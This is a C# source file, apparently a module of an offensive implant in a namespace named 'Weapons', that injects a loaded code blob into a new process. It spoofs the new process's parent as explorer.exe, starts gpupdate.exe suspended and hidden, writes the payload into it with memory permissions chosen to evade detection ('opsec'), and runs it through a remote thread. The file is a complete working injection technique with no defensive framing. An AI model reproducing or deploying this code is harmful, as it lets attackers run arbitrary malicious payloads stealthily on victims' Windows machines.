using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static Weapons.Injector_Utils;

namespace Weapons
{
    // In-Memory Injection
    class Injector
    {
        public const uint CreateSuspended = 0x00000004;
        public const uint DetachedProcess = 0x00000008;
        public const uint CreateNoWindow = 0x08000000;
        public const uint ExtendedStartupInfoPresent = 0x00080000;
        public const int ProcThreadAttributeParentProcess = 0x00020000;

        public static string run(string target)
        {
            byte[] bytes = W_Utils.GetDLLBytes(target);

            if (bytes.Length > 0)
            {
                try
                {
                    // Get PID
                    var p = Process.GetProcessesByName("explorer")[0];

                    // Create new process
                    PROCESS_INFORMATION pInfo = CreateTargetProcess(@"C:\windows\system32\gpupdate.exe", p.Id);

                    // Allocate memory (RW for opsec)
                    IntPtr allocatedRegion = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, (uint)bytes.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

                    // Copy PIC to new process
                    UIntPtr bytesWritten;
                    WriteProcessMemory(pInfo.hProcess, allocatedRegion, bytes, (uint)bytes.Length, out bytesWritten);

                    // Change memory region to RX (opsec)
                    MemoryProtection oldProtect;
                    VirtualProtectEx(pInfo.hProcess, allocatedRegion, (uint)bytes.Length, MemoryProtection.ExecuteRead, out oldProtect);

                    // Create new thread
                    CreateRemoteThread(pInfo.hProcess, IntPtr.Zero, 0, allocatedRegion, IntPtr.Zero, 0, IntPtr.Zero);
                    return "Injection Completed";
                }
                catch { }
                
                return "#!#Injection Failed";
            }
            return "#!#404 - File Not Found";
        }

        public static PROCESS_INFORMATION CreateTargetProcess(string targetProcess, int parentProcessId)
        {
            STARTUPINFOEX sInfo = new STARTUPINFOEX();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

            sInfo.StartupInfo.cb = (uint)Marshal.SizeOf(sInfo);
            IntPtr lpValue = IntPtr.Zero;

            try
            {
                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                pSec.nLength = Marshal.SizeOf(pSec);
                tSec.nLength = Marshal.SizeOf(tSec);

                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow | ExtendedStartupInfoPresent;

                IntPtr lpSize = IntPtr.Zero;

                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                sInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, ref lpSize);

                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfo, out pInfo);

                return pInfo;

            }
            finally
            {
                DeleteProcThreadAttributeList(sInfo.lpAttributeList);
                Marshal.FreeHGlobal(sInfo.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }
        } 
    }
}
